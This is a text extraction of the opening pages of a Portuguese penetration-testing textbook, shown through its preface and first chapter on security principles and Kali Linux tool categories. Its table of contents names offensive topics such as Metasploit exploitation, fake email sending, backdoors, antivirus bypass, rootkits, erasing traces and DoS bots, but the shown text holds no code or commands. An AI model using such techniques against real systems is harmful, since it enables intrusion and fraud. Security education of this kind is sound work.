{
  "numpages": 293,
  "numrender": 293,
  "info": {
    "PDFFormatVersion": "1.4",
    "Language": null,
    "EncryptFilterName": null,
    "IsLinearized": false,
    "IsAcroFormPresent": false,
    "IsXFAPresent": false,
    "IsCollectionPresent": false,
    "IsSignaturesPresent": false,
    "Author": "Daniel Moreno",
    "CreationDate": "2021-04-21 03:08:08+00:00",
    "Creator": "calibre 3.39.1 [https://calibre-ebook.com]",
    "Keywords": "técnico",
    "Producer": "calibre 3.39.1 [https://calibre-ebook.com]",
    "Title": "Introdução ao Pentest"
  },
  "metadata": {},
  "text": "Daniel\tMoreno\nNovatec©\tNovatec\tEditora\tLtda.\t2015.Todos\tos\tdireitos\treservados\te\tprotegidos\tpela\tLei\t9.610\tde\t19/02/1998.\tÉ\tproibida\ta\treprodução\tdesta\tobra,\nmesmo\tparcial,\tpor\tqualquer\tprocesso,\tsem\tprévia\tautorização,\tpor\tescrito,\tdo\tautor\te\tda\tEditora.\nEditor:\tRubens\tPrates\nAssistente\teditorial:\tPriscila\tA.Yoshimatsu\nEditoração\teletrônica:\tCarolina\tKuwabata\nRevisão\tgramatical:\tMari\tKumagai\nCapa:\tCarolina\tKuwabataISBN:\t978-85-7522-618-6\nHistórico\tde\tedições\timpressas:\nJunho/2017\tSegunda\treimpressão\nFevereiro/2016\tPrimeira\treimpressão\nMaio\n/2015\tPrimeira\tediçãoNovatec\tEditora\tLtda.\nRua\tLuís\tAntônio\tdos\tSantos\t110\n02460-000\t–\tSão\tPaulo,\tSP\t–\tBrasil\nTel.:\t+55\t11\t2959-6529\nE-mail:\t\nnovatec@novatec.com.br\nSite:\t\nwww.novatec.com.br\nTwitter:\t\ntwitter.com/novateceditora\nFacebook:\t\nfacebook.com/novatec\nLinkedIn:\t\nlinkedin.com/in/novatecDedico\tminha\tprimeira\tobra\taos\tmeus\tpais\tSuzy\te\tGeraldo\nMoreno.Sumário\nAgradecimentos\nSobre\to\tautor\nPrefácio\nCapítulo\t1\n\t\n■\t\nIntrodução\tà\tsegurança\tda\tinformação\te\tao\tKali\nLinux\n1.1\tPrincípios\tde\tsegurança\tda\tinformação\te\tproteção\tde\tdados\n1.2\tConhecendo\to\tKali\tLinux\nCapítulo\t2\n\t\n■\t\nPreparando\to\tambiente\tde\tteste\n2.1\tRecursos\tnecessários\n2.2\tObtendo\to\tKali\tLinux\n2.2.1\tInstalação\tdo\tVirtualBox\n2.2.2\tInstalação\tde\tuma\tmáquina\tvirtual\n2.3\tConfigurando\ta\trede\tno\tKali\tLinux\n2.4\tTerminal\tde\tcomandos\n2.5\tAtualizando\to\tKali\tLinux\n2.6\tInstalação\tdo\tDebian\n2.7\tBackup\tda\tmáquina\tvirtual\nCapítulo\t3\n\t\n■\t\nPentest\n3.1\tO\tque\té\tpentest?\n3.2\tPorque\trealizá-lo?\n3.3\tTipos\tde\tpentest\n3.3.1\tBlack-box\n3.3.2\tWhite-box\n3.3.3\tGray-box\n3.4\tAnálise\tde\tvulnerabilidade\n3.5\tMetodologias\tde\tpentest\n3.5.1\tMetodologia\tISSAF\n3.5.2\tMetodologia\tOWASP\n3.5.3Metodologia\tOSSTMM3.5.4\tMetodologia\tBacktrack\nCapítulo\t4\n\t\n■\t\nPlanejamento\tdo\tprojeto\n4.1\tInformações\tgerais\n4.2\tObjetivo\tdo\tpentest\n4.3\tLimitações\n4.4\tContrato\tde\tacordo\n4.5\tLinha\tdo\ttempo\nCapítulo\t5\n\t\n■\t\nFootprinting\n5.1\tDNS\n5.1.1\tTipos\tde\tregistro\tDNS\n5.2\tLaboratório\t–\tEnumeração\tDNS\n5.3\tProgramas\tpara\tenumeração\tDNS\n5.3.1\tDNSenum\n5.3.2\tDNSmap\n5.3.3\tDNSrecon\n5.3.4\tFierce\n5.4\tColeta\tde\temail\n5.5\tFirewall\tiptables\n5.5.1\tComandos\tpara\tgerenciamento\tdo\tiptables\n5.6\tInformações\tde\trota\n5.6.1\tTraceroute\n5.6.2\tTCPtraceroute\nCapítulo\t6\n\t\n■\t\nFingerprinting\n6.1\tFingerprinting\tpassivo\n6.1.1\tP0f\n6.2\tFingerprinting\tativo\n6.2.1\tPing\n6.2.2\tFping\n6.2.3\tArping\n6.2.4\tNetdiscover\n6.2.5\tHping3\n6.2.6\tXprobe2\n6.2.7\tMaltego\nCapítulo\t7\n\t\n■\t\nEnumeração7.1\tModelo\tOSI\n7.2\tProtocolo\tTCP/IP\n7.3\tPort\tscanner\n7.3.1\tNmap\n7.4\tO\tcanivete\tsuíço\tNetcat\n7.4.1\tLaboratório\tNetcat\n7.5\tEnumeração\tSMTP\n7.5.1\tLaboratório\temail\n7.5.2\tSTMPUser\tenum\n7.5.3\tComo\tenviar\temails\tfalsos\t(via\tPHP)\n7.5.4\tComo\tenviar\temails\tfalsos\t(via\tOpen\tRelay)\n7.6\tEnumeração\tSNMP\n7.6.1\tSNMPcheck\n7.6.2\tOneSixtyOne\nCapítulo\t8\n\t\n■\t\nMapeamento\tde\tvulnerabilidades\n8.1\tTipos\tde\tvulnerabilidades\n8.1.1\tVulnerabilidade\tlocal\n8.1.2\tVulnerabilidade\tremota\n8.2\tScanners\tde\tvulnerabilidade\n8.2.1\tOpenVAS\n8.2.2\tNessus\nCapítulo\t9\n\t\n■\t\nExploração\tdo\talvo\n9.1\tMetasploit\n9.1.1\tMsfconsole\n9.1.2\tComandos\tbásicos\n9.2\tA\tvulnerabilidade\tMS12-020-maxchannelids\n9.3\tExploitando\tWindows\tvulnerável\n9.4\tPayload\tMeterpreter\n9.4.1\tCore\tcommands\n9.4.2\tFile\tsystem\tcommands\n9.4.3\tNetworking\tcommands\n9.4.4\tSystem\tcommands\n9.4.5\tUser\tInterface\tcommands\n9.5\tPivoting\tcom\tMetasploit\n9.6\tVPN\tPivoting\t(Pivoting\tvia\tLayer\t2)\n9.7\tVulnerabilidade\tshellshock9.8\tExplorando\tservidores\tNFS\tmal\tconfigurados\n9.9\tExplorando\tX\tWindow\tSystem\nCapítulo\t10\n\t\n■\t\nEngenharia\tsocial\n10.1\tProcesso\tde\tataque\n10.2Tipos\tde\tengenharia\tsocial\n10.3\tSET\t(Social\tEngineering\tToolkit)\n10.4\tOffice\t2010\tpptimpconv\tDLL\thijacking\n10.5\tMacros\tmaliciosas\n10.6\tInternet\tExplorer\tms10_046\n10.7\tInternet\tExplorer\t<\t11\t–\tOLE\tAutomation\tArray\tRemote\tCode\tExecution\n10.8\tFirefox\tAdd-on\n10.9\tUnitrix\tExploit\n10.10\tBadUSB\n10.10.1\tLaboratório\tBadUSB\nCapítulo\t11\n\t\n■\t\nEscalonamento\tde\tprivilégios\n11.1\tEscalonamento\tde\tprivilégios\toffline\n11.1.1\tCommon\tUser\tPasswords\tProfiler\n11.2\tEscalonamento\tde\tprivilégios\tonline\n11.2.1\tCewl\n11.2.2\txHydra\n11.2.3\tHydra\n11.3\tSniffers\n11.3.1Sniffer\ttcpdump\n11.3.2\tSniffer\tWireshark\n11.4\tAtaques\tMan-in-the-Middle\t(MitM)\n11.4.1\tARP\tSpoofing\n11.4.2\tArpspoof\n11.4.3\tNping\n11.4.4\tDNS\tSpoofing\n11.4.5\tDnsspoof\n11.4.6\tSSLStrip\n11.4.7\tSSLSplit\n11.4.8\tAtaque\tSSLStrip,\tDNS\tSpoofing\te\tJava\tApplet\n11.4.9\tBloqueando\to\tArp\tSpoofing\nCapítulo\t12\n\t\n■\t\nManutenção\tdo\tacesso12.1\tBackdoors\n12.1.1\tBackdoors\tde\tconexão\tdireta\n12.1.2\tBackdoors\tde\tconexão\treversa\n12.2\tBackdoor\tsbd\n12.2\tCavalos\tde\tTroia\n12.3\tEXE\tJoiner\n12.4\tBypass\tA.V\n12.4.1\tCompressores\tde\tarquivos\n12.4.2\tCrypters/Encoders\n12.4.3\tVeil-Framework\n12.5\tKeylogger\n12.6\tHoneypots\n12.6.1\tValhala\tHoneypot\n12.6.2\tHoneyd\n12.7\tRootkits\n12.7.1\tUserland\n12.7.2\tKernel\tLand\nCapítulo\t13\n\t\n■\t\nApagando\trastros\nCapítulo\t14\n\t\n■\t\nTunneling\n14.1\tLaboratório\tTunneling\n14.2\tSSH\tTunneling\n14.3\tUDP\ttunneling\n14.4\tDNS\ttunneling\n14.5\tICMP\tTunneling\n14.6\tCanais\tencobertos\tvia\ttunneling\n14.7\tHTTP\tTunnel\n14.8\tRedes\tTOR\nCapítulo\t15\n\t\n■\t\nDoS\t–\tDenial\tof\tService\n15.1\tSYN\tFlood\n15.1.1\tT50\n15.2\tSlowloris\n15.3\tDDoS\t(Distributed\tDenial\tOf\tService)\n15.4\tProjeto\tPerl-Bot\nCapítulo\t16\n\t\n■\t\nDocumentação\ttécnica16.1\tTipos\tde\trelatórios\n16.1.1\tRelatório\tExecutivo\n16.1.2\tRelatório\ttécnico\n16.1.3\tRelatório\tcomercial\n16.2\tCriptografando\trelatórios\tcom\to\tTruecrypt\n16.2.1\tCriando\tum\tarquivo\tcriptografado\n16.2.2\tCriando\tum\tpendrive\tcriptografado\nCapítulo\t17\n\t\n■\t\nPentest\tem\tredes\tsem\tfio\nApêndice\n\t\n■\t\nRelatório\tde\tpentest\n1\tSumário\texecutivo\n2\tResultados\n3\tNarrativa\tdo\tataque\n3.1\tVulnerabilidade\tna\trede\tsem\tfio\n3.2\tVulnerabilidades\tno\tWindows\t7\n4\tContramedidas\n4.1\tTP-LINK\n4.2\tWindows\t7\n5\tSobre\to\trelatório\tfinal\nReferênciasAgradecimentos\nPrimeiro,\tagradeço\ta\ttodos\tos\tleitores\tque\tconfiaram\te\tadquiriram\testa\tobra,\ncomo\tum\tvoto\tde\tconfiança\tno\tmeu\ttrabalho.\tSou\teternamente\tgrato\ta\tvocês.\nAgradeço\ttambém\tà\tNovatec\tEditora\tpor\tter\tme\tdado\ta\tchance\te\ta\toportunidade\nde\tpublicar\to\tmeu\tprimeiro\tlivro\te\tmostrar\tao\tpúblico\to\tmeu\ttrabalho.\tÉ\tuma\nresponsabilidade\tenorme\tque\tvou\thonrar.\nA\ttodos\tos\tentes\tqueridos\tque\tjá\tse\tforam,\tos\tquais\teu\tamei\tmuito\tenquanto\nvivos.\nAos\tmeus\tpais\tGeraldo\te\tSuzy,\tque\tme\tapoiam\tem\tmeus\tprojetos.\nÀ\tminha\tavó\tJandira,\tao\tmeu\tavô\tGeraldo,\taos\tmeus\ttios\tCarlos\te\tPaulinho,\tàs\ntias\tKarla,\tSilvana\te\tMarissol,\te\ta\ttodos\tos\toutros\tfamiliares.\nPor\túltimo,\tmas\tnão\tmenos\timportantes,\taos\tamigos\tque\tme\tincentivaram\ta\npublicar\teste\tlivro\t(não\tvou\tcitar\tnomes\tpara\tnão\tter\tbriguinhas,\tOK?).\nObrigado\ta\ttodos.\nCom\tum\tenorme\tcarinho.\nDaniel\tMorenoSobre\to\tautor\nDaniel\tMoreno\té\tbacharel\tem\tCiências\tda\tComputação\tpela\tUniversidade\nEstadual\tPaulista\tJúlio\tde\tMesquita\tFilho\t–\tUNESP,\tcampus\tRio\tClaro.\tComo\nentusiasta\tdo\tLinux\te\tdo\tmundo\tOpen\tSource,\tjá\tpublicou\tartigos\tem\ncomunidades\tde\tsegurança\tda\tinformação\te\tde\tLinux.\nÉ\tdesenvolvedor\tde\tpequenos\texploits\tdivulgados\tem\tsites,\tcomo\tExploit-DB\te\nPacketStormSecurity\t(a.k.a\tW1ckerMan),\tcolaborador\tdo\tprojeto\tPerl-Bot,\npalestrante\te\tinstrutor\tde\tpentest\te\tLinux\tno\tCentro\tde\tTreinamento\tda\tNovatec\n1\n.\n1\n\tMais\tinformações\tsobre\ttreinamentos\tem\tpentest\te\toutros\tcursos,\tconsulte\t\nhttp://ctnovatec.com.br\n.Prefácio\nEm\tmeados\tda\tdécada\tde\t70,\ta\tinternet\tcomeçava\ta\tganhar\tvida.\tCom\ta\tsua\nprecursora,\ta\tARPANet,\to\tobjetivo\tdessa\tpequena\tinternet\tera\tinterligar\ndepartamentos\te\tinstituições\tamericanas\tpara\ttroca\tde\tdados,\tinformação\tetc.\nComo\tera\tuma\trede\tpequena\t(pois\ta\tcomunicação\tera\tapenas\tentre\talguns\ndepartamentos\tamericanos),\tos\tdados\te\tinformações\tque\ttrafegavam\tsempre\nforam\tde\torigens\tconfiáveis.\tOs\tprotocolos\te\tos\tmeios\tde\tcomunicação,\tcomo\núltima\tpreocupação,\ttinham\tde\tser\tseguros,\trobustos\te\tindecifráveis.\tOs\tmeios\tde\ntransmissão\teram\tsimples\te\tnão\tnecessitavam\tde\tprotocolos\tcriptográficos\tde\núltima\tgeração.\tFoi\taí\tque\to\tprimeiro\terro\tsurgiu:\ta\tfalta\tde\tum\tsistema\tque\ngarantisse\ta\tsegurança\tda\tinformação.\nObviamente,\tengenheiros\te\tprojetistas\tnão\tesperavam\tque\ta\tARPANet\tfosse\ntomar\tproporções\tmundiais.\tPorém\tela\tse\texpandiu,\tcresceu\te\ttornou-se\to\tque\nhoje\tconhecemos\tcomo\tinternet.\tAssim\tcomo\ta\tARPANet,\ta\tinternet\tcarregou\ta\nmaldita\therança\tda\tinsegurança\tde\tdados\te\thoje\tpaga\tpor\tisso.\nO\tintuito\tdo\tlivro\t\nIntrodução\tao\tPentest\n\té\tcapacitar\to\tleitor\tao\tentendimento\te\tà\nrealização\tdo\tpentest\t–\tuma\tauditoria\tminuciosa\tsobre\tfalhas\te\tvulnerabilidades\nem\tcomputadores\te\tredes\tde\tcomputadores,\tcom\to\tobjetivo\tde\tidentificar\to\ncalcanhar\tde\tAquiles\te,\tassim,\tbuscar\ta\tmelhor\tforma\tde\tcorrigir\tesse\tproblema.\nO\tavanço\ttecnológico\té\ttão\tgrande\tque\tjá\texistem\tsistemas\toperacionais\nespecializados\tna\trealização\tdo\tpentest,\tcomo\té\to\tcaso\tdo\tKali\tLinux\t–\tum\nsistema\toperacional\tpara\tauditoria\te\trealização\tde\tdiversos\ttipos\tde\tpentest,\ttais\ncomo\tredes\tsem\tfio\t(wireless),\tweb,\tbancos\tde\tdados,\tanálise\te\tlevantamento\tde\nvulnerabilidades\tetc.\tO\tKali\tLinux\tfornece\tferramentas\tavançadas\tpara\nidentificação,\tdetecção\te\texploração\tde\tdiversas\tvulnerabilidades.\nEste\tlivro\ttem\tcomo\tfinalidade\tintroduzir\to\tleitor\tao\tmundo\tdo\tpentest\t(também\nchamado\tde\tteste\tde\tpenetração\tou\tteste\tde\tintrusão),\tconduzindo-o,\tpor\tmeio\tda\nmetodologia\tBacktrack,\tao\tpasso\ta\tpasso\tde\tcomo\tmontar\tum\tambiente\tsimulado\npara\ta\trealização\tdo\tpentest.\tO\tlivro\té\tdividido\tem\tcapítulos\torganizados\tde\nacordo\tcom\tessa\tmetodologia,\tpara\tum\tmelhor\tentendimento\tde\tcada\tetapa\tde\num\tteste\tde\tpenetração.Espero\tque\to\tleitor\taproveite\tao\tmáximo\to\tlivro\te\tusufrua\to\tconhecimento\tpara\to\nbem,\tpodendo\tefetuar\to\tprocesso\tde\tteste\tde\tintrusão\tem\tsua\trede\te\tna\trede\tde\nseus\tclientes.\nO\tverdadeiro\thacker\té\taquele\tque\tsegue\to\tcaminho\tdo\tconhecimento,\tensinando,\nbuscando\te\taprendendo\tcada\tvez\tmais\tsobre\taquilo\tque\to\tinstiga.\nSejam\tbem-vindos\tao\tnovo\tmundo\tdo\thacking\tético!\tUma\tlonga\tjornada\tos\naguarda,\t\nNeo\n.CAPÍTULO\n\t1\nIntrodução\tà\tsegurança\tda\tinformação\te\nao\tKali\tLinux\nAntes\tde\tiniciarmos\tos\testudos\tsobre\t\npentest\n\te\tKali\tLinux,\té\tnecessário\nentendermos\tconceitos\tfundamentais\tsobre\tsegurança\tda\tinformação,\tpara\t\nque\to\nleitor\ttenha\tum\taprendizado\tmais\tabrangente\tsobre\tsegurança\tdigital,\ttendo\tem\nvista\tque\to\t\npentest\n\té\tapenas\tuma\tpequena\tparte\tquando\to\tassunto\té\tsegurança\tde\ndados.\n1.1\tPrincípios\tde\tsegurança\tda\tinformação\te\tproteção\nde\tdados\nA\tsegurança\tda\tinformação\tbaseia-se\tnos\tseguintes\tprincípios:\n•\t\nAutenticidade\n\t–\tDefine\tque\ta\tinformação\testá\tsendo\tenviada\tpor\tuma\tfonte\nlegítima\te\tsegura,\te\tnão\tfoi\tinterceptada\te\talterada\tpor\tatacantes.\tUm\nexemplo\tde\tquebra\tde\tautenticidade\tsão\tataques\tMitM\t(Man-in-the-Middle)\nem\tque\to\tatacante\tfaz\ta\tinterceptação\te\ta\talteração\tdos\tdados\tantes\tde\nretransmiti-los\tao\tdestinatário.\n•\t\nConfidencialidade\n\t–\tDefine\tque\tsomente\tpessoas\tque\ttenham\tas\tpermissões\ncorretas\tdevem\tacessar\tuma\tdeterminada\tinformação.\tExemplos\tde\tquebra\tde\nconfidencialidade:\tescalonamento\tde\tprivilégios,\tataques\tde\tquebra\tde\nsenhas,\tataques\tMan-in-the-Middle,\tuso\tde\tcavalos\tde\tTroia\tetc.\n•\t\nDisponibilidade\n\t–\tDefine\tque\ta\tinformação\tdeverá\testar\tsempre\tdisponível.\nUm\texemplo\tde\tquebra\tde\tdisponibilidade\tseria\tum\tataque\tde\tDoS\t(Negação\nde\tServiço).\n•\t\nIntegridade\n\t–\tDefine\tque\ta\tinformação\tmantenha-se\tíntegra\te\tinalterada.\tUm\nexemplo\tde\tquebra\tde\tintegridade\tseria\tquando\tum\tfuncionário\ttenta\talterar\ta\nplanilha\tde\tpagamentos\tpara\treceber\tvalores\tsuperiores\taos\tque\trecebe.\n•\t\nLegalidade\n\t–\tDefine\tse\ta\tinformação\testá\tde\tacordo\tcom\ta\tlegislação\tde\tum\npaís.Os\tprincípios\tda\tsegurança\tda\tinformação\tpodem\tser\tcomprometidos\tcom\npossíveis\tameaças,\tque\tpodem\tser\tclassificadas\tem\tfísicas\te\tlógicas.\n•\tAmeaças\tfísicas\tincluem\ttodo\te\tqualquer\tprocesso\tde\tnatureza\tfísica\tque\npossa\tcomprometer\tos\tprincípios\tda\tsegurança\tda\tinformação.\tExemplos:\nalagamentos,\ttempestades,\tfuracões,\traios,\tdesabamentos\tetc.\n•\tAmeaças\tlógicas\tincluem\ttodo\te\tqualquer\tprocesso\tde\tnatureza\tlógica\tque\npossa\tcomprometer\tos\tprincípios\tda\tsegurança\tda\tinformação.\tExemplos:\nvírus,\tataques\tde\tquebra\tde\tsenhas,\tescuta\tde\tdados\t(sniffers)\tetc.\nVisando\tdiminuir\tas\tameaças,\thá\tuma\tsérie\tde\tmecanismos\tde\tsegurança\tque\npodem\tser\tutilizados\tde\tacordo\tcom\to\ttipo\tde\tameaça\tencontrada,\tpor\texemplo:\na\tadoção\tde\tchaves,\tfechaduras\te\tcâmeras,\te\tlocalização\tgeográfica\tfavorável\n(sem\tterremotos,\ttremores\te/ou\tdesastres\tnaturais),\tpara\tameaças\tfísicas;\te\nsistema\tde\tcriptografia,\tantivírus,\tfirewall,\tconscientização\tdos\tfuncionários\nsobre\tperigos\te\tfraudes\tdigitais,\tpara\tameaças\tlógicas.\nAlém\tdos\tsistemas\tcitados,\thá\tdiversos\tserviços\trelacionados\tà\tsegurança\tda\ninformação\tcom\to\tintuito\tde\tmitigar\tas\tameaças\tàs\tquais\tas\tredes\tcorporativas\nestão\texpostas\tdiariamente.\tAlguns\tserviços\tque\tvalem\ta\tpena\tser\tcitados\tsão\ta\nanálise\tde\tvulnerabilidade,\ta\tperícia\tforense,\ta\tadoção\tde\tpolíticas\tde\tsegurança\n(Normas\tISO)\te\to\tteste\tde\tintrusão\t(pentest).\nAntes\tde\tentrarmos\tno\tassunto\tde\tpentest,\tvale\ta\tpena\tcitar\tos\tprincipais\tmeios\npara\tmitigar\tas\tameaças\tdigitais.\n•\t\nAnálise\tforense\n\t–\n\t\nConsiste\tem\tutilizar\ttécnicas\tpara\trastrear\to\tatacante.\nLembre-se\tde\tque:\tuma\tinvasão\tsempre\tvai\tgerar\trastros.\tEntão,\tpor\tmeio\tda\nanálise\tforense,\té\tpossível\trastrear\to\tatacante.\n•\t\nHardening\n\t–\n\t\nConsiste\tna\timplementação\tde\tmáquinas\tseguras.\tPor\texemplo,\npor\tmeio\tdo\thardening,\tmódulos\tconhecidamente\tvulneráveis\tsão\ndesabilitados,\te\tuma\tanálise\té\trealizada\tpara\tconstatar\tse\taquele\tservidor\nutiliza\tnomes\tde\tusuários\te\tsenhas\t(credenciais)\tpadrões\tde\tfábrica\tetc.\tO\nintuito\tdo\thardening\té\ttornar\tuma\tmáquina\tmais\tsegura\te\tmais\tdifícil\tde\tser\ninvadida.\tLembre-se\tde\tque:\tnão\texiste\tservidor\t100%\tseguro,\tmas\to\ttrabalho\ndo\thardening\té\tdificultar\tao\tmáximo\ta\tatuação\tde\tcriminosos\tdigitais.\n•\t\nRevisão\tdo\tcódigo-fonte\n\t–\n\t\nMuito\tparecida\tcom\to\thardening,\ta\tideia\tda\nrevisão\tdo\tcódigo-fonte\té\tgarantir\tsegurança\tao\tcódigo-fonte\tda\taplicação.\tArevisão\tdo\tcódigo-fonte\tpode\tser\trealizada\tem\tplataforma\tweb\t(como\trevisar\no\tcódigo-fonte\tde\tuma\tpágina\tPHP)\tou\tmesmo\tem\taplicativos\t(como\trevisar\no\tcódigo-fonte\tde\tum\taplicativo\texecutável).\tNa\tmaioria\tdos\tcasos,\tquando\num\taplicativo\tnecessita\tter\tseu\tcódigo-fonte\trevisado\t(como\tum\taplicativo\nexecutável),\to\tcódigo-fonte\tnão\té\tfornecido\tao\tauditor.\n•\t\nDesenvolvimento\tde\texploits\tcomerciais\n\t–\n\t\nExploits\tsão\tprogramas\tque\nexploram\tfalhas\tem\toutros\tsoftwares.\tCom\to\tintuito\tde\ttestar\ta\tsegurança\tde\numa\taplicação,\to\texploit\tatua\tcomo\tuma\tprova\tde\tconceito\tde\tque\ta\nvulnerabilidade\texiste\te\tpode\tser\texplorada.\tHá\texploits\tque\tcausam\nparalisação\tdo\tserviço\tou,\taté\tmesmo,\tgarantem\to\tacesso\tao\tsistema\noperacional\tdo\talvo.\tExploits\tserão\texplicados\tno\tdecorrer\tdo\tlivro.\n•\t\nAnálise\te\tdetecção\tde\tintruso\n\t–\n\t\nConsiste\tapenas\tno\tmonitoramento\tda\trede\nem\tbusca\tde\tpossíveis\tintrusos.\tDiferentemente\tdo\thardening\te\tdo\tpentest,\ta\nanálise\tapenas\tfaz\to\tmonitoramento\tda\trede.\tCaso\texista\talgum\tatacante,\ntodas\tas\tsuas\tatividades\te\tpassos\tserão\tregistrados.\n•\t\nNormas\tISO\n\t–\n\t\nAs\tnormas\tISO\ttêm\tcomo\tobjetivo\tgarantir\tpadrões\te\nqualidade\tpara\tuma\tmelhor\tgestão\te\tadministração\tdo\tnegócio.\tAlgumas\tdas\nnormas\tvoltadas\tà\tsegurança\tda\tinformação\tsão:\n•\t\nBS779-2\n\t–\tNorma\tantiga\trelacionada\ta\tpráticas\tde\tgerenciamento\tda\nsegurança\tda\tinformação.\tSubstituída\tpela\tISO\t27001.\n•\t\nISO\t27001\n\t–\tNorma\tmais\tatual\tque\tsubstituiu\ta\tnorma\tBS7799-2\te\testá\nrelacionada\ta\tpadrões\tda\tsegurança\tda\tinformação.\n•\t\nISO\t27002\n\t–\tCódigo\tde\tboas\tpráticas\tque\tsubstituiu\ta\tnorma\tISO\n17799:2005.\n•\t\nISO\t27003\n\t–\tDiretrizes\tpara\timplementar\tpolíticas\tpara\tgestão\tde\nsegurança\tda\tinformação.\n•\t\nISO\t27004\n\t–\tPráticas\tpara\trelatórios.\n•\t\nISO\t27005\n\t–\tPráticas\tpara\tsistema\tde\tcontrole.\n•\t\nISO\t27006\n\t–\tPráticas\tpara\trequisitos.\n•\t\nAnálise\tde\tvulnerabilidades\n\t–\n\t\nA\tanálise\tde\tvulnerabilidades\té\tsimilar\tao\npentest,\tpois\ttambém\trealiza\tuma\tauditoria\tpara\tencontrar\tfalhas;\tembora\tela\nfaça\tsomente\tum\tlevantamento\tdas\tvulnerabilidades,\te\talgumas\tetapas\tnão\nsão\texecutadas,\tpara\tnão\tcomprometer\to\tsistema\tauditado.•\t\nPentest\n\t–Auditoria\tque\ttem\tcomo\tobjetivo\tdetectar\tde\tmaneira\tativa\tfalhas\te\nvulnerabilidades\tno\tsistema.\tVai\talém\tde\tapenas\tidentificar\terros.\tDurante\num\tpentest,\tsão\ttestados\te\tutilizados\texploits\tque\tmostram\ta\tprova\tde\nconceito\tque\ta\tvulnerabilidade\tpode\tser\texplorada.\tOs\tprincipais\ttipos\tde\npentest\tque\tpodem\tser\tefetuados\tsão:\n•\t\nRedes\tcabeadas\n\t–\tFoco\tdo\tlivro.\tSão\tutilizadas\tferramentas\tpara\tdescobrir\ne\tmapear\tfalhas\tem\tredes\tcabeadas\tde\tcomputadores.\n•\t\nRedes\tsem\tfio\n\t–\tTesta\tse\tuma\trede\tsem\tfio\tpossui\tvulnerabilidades.\tUma\nrede\tsem\tfio\tmal\tconfigurada\tpode\tpermitir\tacessos\tnão\tautorizados.\n•\t\nAplicativos\tweb\n\t–\tTesta\ta\tsegurança\tem\twebsites.\n•\t\nVoIP\n\t–\tTestar\ta\tconectividade\te\ta\tsegurança\tem\tservidores\tVoIP\t(Voz\nsobre\tIP).\n•\t\nMobile\t\n–\tTestar\ta\tsegurança\tem\taplicativos\tmóveis,\tseja\trealizando\to\npentest\tou\tdesenvolvendo\taplicativos\tseguros\tou\tmaliciosos.\n•\t\nTestes\tde\tstress\n\t–\tConsiste\tem\tsobrecarregar\to\tservidor\tcom\texcesso\tde\ndados,\tpara\tdeterminar\tse\tele\taguenta\ta\tsobrecarga.\n1.2\tConhecendo\to\tKali\tLinux\nO\tKali\tLinux\té\tum\tsistema\toperacional,\tbaseado\tno\tDebian,\tdestinado\ta\ttestes\nde\tpenetração.\tFornece\tdiversas\tferramentas\tpara\tauditoria\te\trealização\tde\tteste\nde\tsegurança\tem\tredes\tde\tcomputadores,\tpermitindo\tdescobrir\te\texplorar\ndiversos\ttipos\tde\tvulnerabilidades.\nAs\tferramentas\tcontidas\tno\tKali\tLinux\tpodem\tser\tcategorizadas\tem\n1\n:\n•\t\nInformation\tGathering\n\t–\tFerramentas\tpara\tcoletar\tinformações.\tPor\nexemplo:\tenumeração\tda\trede\tcom\tsua\ttopologia\tpor\tmeio\tde\tDNS,\nmapeamento\tda\trota\tde\tdados,\tcoleta\tde\temails,\twebsites,\tcomputadores\nonline,\tfingerprinting,\tanálise\tdo\tprotocolo\tSMB,\tSNMP,\tVoIP\tetc.\n•\t\nVulnerability\tAnalysis\n\t–\tFerramentas\tpara\tanalisar\tvulnerabilidades\tem\nsoftware\te/ou\thardware.\tPor\texemplo:\tanálise\tem\taparelhos\tCisco,\tbancos\tde\ndados,\tscanners\tautomatizados\tde\tvulnerabilidades\tetc.\n•\t\nWeb\tApplication\n\t–\tFerramentas\tpara\tanalisar\tvulnerabilidades\tem\tambiente\nweb.\tPor\texemplo:\tidentificação\te\texploração\tde\tservidores\tCMS,ferramentas\tde\tfuzzing\tpara\tweb,\tproxies\tpara\tanálise\tde\tdados,\tcrawlers\te\nscanners\tautomatizados.\n•\t\nPassword\tAttack\n\t–\tFerramentas\tpara\tquebra\tde\tsenhas.\tAs\tferramentas\npodem\tser\ttanto\toffline\t(por\texemplo,\tataque\tcontra\thash\tde\tsenhas)\tquanto\nonline\t(ataque\tcontra\tuma\tpágina\tde\tautenticação\tweb).\n•\t\nWireless\tAttacks\n\t–\tFerramentas\tpara\tanálise\tdo\ttráfego\tem\tredes\tsem\tfio\n(wireless).\n•\t\nExploitation\tTools\n\t–\tFerramentas\tpara\texplorar\tas\tvulnerabilidades\nencontradas\tnas\tetapas\tanteriores.\tPor\texemplo:\tframeworks\tpara\tteste\te\ndesenvolvimento\tde\texploits\te\tXSS,\tteste\tde\tequipamentos\tCisco\te\nengenharia\tsocial.\n•\t\nSniffing/Spoofing\n\t–\tFerramentas\tpara\tcapturar\ttráfego\tde\tinformações\ttanto\nlocais\tquanto\tremotas.\tNesta\tcategoria\tencontram-se\tos\tpoderosos\tsniffers.\n•\t\nMaintaining\tAccess\n\t–\tFerramentas\tusadas\tcom\to\tintuito\tde\tpermitir\tum\nacesso\tfuturo,\tmesmo\tque\to\tsistema-teste\tjá\ttenha\tsido\texplorado\te\tque\ta\nantiga\tfalha\texplorada\ttenha\tsido\tcorrigida.\tBackdoors\tsão\tencontradas\taqui,\ntanto\tpara\tsistema\toperacional\tquanto\tpara\tweb.\tFerramentas\tde\ttunneling\npara\t“furar”\tregras\tde\tfirewall\ttambém\tse\tencontram\tnesta\tcategoria.\n•\t\nStress\tTesting\n\t–\tFerramentas\tpara\tsobrecarregar\to\tservidor\tcom\texcesso\tde\ndados.\tNão\ttêm\tcomo\tobjetivo\to\tacesso\tnão\tautorizado,\te\tsim\tapenas\to\tenvio\nde\tuma\tenxurrada\tde\tpacotes\tpara\tcausar\tlentidão\tno\tservidor.\tEmbora\npareçam\tinofensivas,\tas\tferramentas\tdesta\tcategoria\tpodem\tser\tutilizadas\ncontra\tservidores\tremotos\tcom\to\tintuito\tde\tcausar\tprejuízos\tfinanceiros.\tJá\nimaginou\tum\tserviço\tde\tbanco\tonline\tcongestionado?\nHá\toutras\tcategorias\tde\tferramentas,\tpara\tanálise\tforense,\tengenharia\treversa,\nanálise\tde\thardware,\tAndroid,\tmas\tfogem\tdo\tescopo\tdo\tlivro.\n1\n\t\nCategorizada\tsegundo\to\tlivro\t\nBacktrack\t4:\tAssuring\tSecurity\tby\tPenetration\tTesting\n,\tp.\t10.CAPÍTULO\n\t2\nPreparando\to\tambiente\tde\tteste\n2.1\tRecursos\tnecessários\nPara\ts